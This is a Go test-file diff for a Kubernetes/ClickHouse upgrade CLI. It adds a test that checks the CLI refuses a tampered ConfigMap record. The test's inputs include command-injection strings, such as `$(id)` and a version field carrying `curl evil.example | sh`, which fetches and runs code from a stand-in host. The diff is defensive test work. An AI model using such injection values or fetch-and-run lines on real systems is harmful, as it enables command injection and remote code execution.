@@ -1,6 +1,7 @@
 package cmd
 
 import (
+	"maps"
 	"reflect"
 	"slices"
 	"strings"
@@ -316,6 +317,42 @@ func TestOrdinaryMoveWithTheRecordUnreadable(t *testing.T) {
 	out, err = upgradeK8s(t, "0.1.20")
 	if err == nil || !strings.Contains(out, "Grant get on configmaps") || g.at(helmUpgrade) >= 0 || g.lease != nil {
 		t.Fatalf("a move that can touch the table needs the record: err=%v:\n%s", err, out)
+	}
+}
+
+func TestUpgradeRefusesARecordThisCLIDidNotWrite(t *testing.T) {
+	// The record is a ConfigMap anyone who may write ConfigMaps in the
+	// namespace can write, and its aside name goes into the statement the
+	// reset runs in the ClickHouse pod: a record not of this CLI's shape is
+	// refused before anything runs, not obeyed.
+	for _, tc := range []struct{ field, value string }{
+		{"aside", `x"; id; echo "`},
+		{"aside", "events_pre_reset_1 TO events.y"},
+		{"version", "0.1.20; curl evil.example | sh"},
+		{"channel", "edge --set x=$(id)"},
+		{"action", "drop"},
+	} {
+		t.Run(tc.field, func(t *testing.T) {
+			f := newFakeKube(t, "0.1.17", "String").withMarker("0.1.20", "events_pre_reset_100")
+			f.marker[tc.field] = tc.value
+			before := maps.Clone(f.marker)
+			out, err := upgradeK8s(t, "0.1.20")
+			msg := out
+			if err != nil {
+				msg += err.Error()
+			}
+			if err == nil || !strings.Contains(msg, "not a record this CLI wrote") || !strings.Contains(msg, "kubectl delete configmap "+resetMarkerConfigMap) {
+				t.Fatalf("got err=%v:\n%s", err, out)
+			}
+			if f.at(helmUpgrade) >= 0 || f.lease != nil || !maps.Equal(f.marker, before) {
+				t.Fatalf("a refused run changed the cluster: helm=%d lease=%v record=%v", f.at(helmUpgrade), f.lease, f.marker)
+			}
+			for _, c := range f.calls {
+				if strings.Contains(c, "exec") {
+					t.Fatalf("ran in the ClickHouse pod: %s", c)
+				}
+			}
+		})
 	}
 }
 
@@ -768,7 +805,7 @@ func TestLeaseIsGivenUpOnEveryWayOut(t *testing.T) {
 		t.Run(tc.name, func(t *testing.T) {
 			f := newFakeKube(t, "0.1.17", "String")
 			tc.setup(f)
-			upgradeK8s(t, "0.1.20")
+			_, _ = upgradeK8s(t, "0.1.20") // each way out but one fails; only the lease is checked
 			if f.lease != nil || f.count("kubectl create") != 1 {
 				t.Fatalf("lease %v after %d creates", f.lease, f.count("kubectl create"))
 			}
@@ -778,9 +815,12 @@ func TestLeaseIsGivenUpOnEveryWayOut(t *testing.T) {
 
 // ── A fresh install ──────────────────────────────────────────────────────────
 
-func freshDeploy(t *testing.T, f *fakeKube) (string, error) {
+func freshDeploy(t *testing.T, f *fakeKube, ext ...*externalClickHouse) (string, error) {
 	t.Helper()
 	p := &k8sPlan{chartVer: "0.1.20", preset: presets[0], exposeMode: 2, ingressHost: "events.example.com", ingressClass: "nginx"}
+	if len(ext) > 0 {
+		p.clickhouse = ext[0]
+	}
 	var err error
 	out := captureStdout(t, func() {
 		err = applyKubernetes(&token.Enrollment{ID: "dp_test", Tok: "tok", Addr: "cp.example.com:443", URL: "https://cp.example.com"}, nil, p)
@@ -811,7 +851,7 @@ func TestFreshInstallChecksWithoutHoldingTheInstallUp(t *testing.T) {
 			t.Fatalf("summary does not mark the failure:\n%s", out)
 		}
 		// The rerun the message names creates the table: it is a recorded create.
-		if f.marker["action"] != markerCreate || f.marker["version"] != "0.1.20" || !strings.Contains(out, "`origamy upgrade --version 0.1.20` finishes it and checks again") {
+		if f.marker["action"] != markerCreate || f.marker["version"] != "0.1.20" || !strings.Contains(out, "`origamy upgrade --version 0.1.20` finishes the work on the events table left recorded") {
 			t.Fatalf("record %v:\n%s", f.marker, out)
 		}
 		if strings.Contains(out, "history from before the reset") || strings.Contains(out, "Then `") && strings.Contains(out, "Once it answers: Then") {
@@ -820,6 +860,19 @@ func TestFreshInstallChecksWithoutHoldingTheInstallUp(t *testing.T) {
 		out, err = upgradeK8s(t, "0.1.20")
 		if err != nil || f.live != "JSON" || f.marker != nil || f.asideCall() >= 0 || len(f.dropped) != 0 {
 			t.Fatalf("rerun: err=%v live=%q record=%v:\n%s", err, f.live, f.marker, out)
+		}
+	})
+	t.Run("the table is missing on an external ClickHouse: by hand, nothing recorded", func(t *testing.T) {
+		// The CLI never creates the table on an external server, so a record
+		// would name a rerun that refuses, and hold rollbacks and deploys up.
+		f := newFakeKube(t, "0.1.20", "").useExternal("")
+		f.initJobOff = true
+		out, err := freshDeploy(t, f, &externalClickHouse{host: "ch.example.com", port: 9440, secure: true, user: "origamy"})
+		if err == nil || !strings.Contains(out, "Send events") || !strings.Contains(out, "apply the chart's schema") {
+			t.Fatalf("got err=%v:\n%s", err, out)
+		}
+		if f.marker != nil || strings.Contains(out, "Then The") || strings.Contains(out, "left recorded") {
+			t.Fatalf("record %v:\n%s", f.marker, out)
 		}
 	})
 	t.Run("ClickHouse cannot be asked: not a failure", func(t *testing.T) {
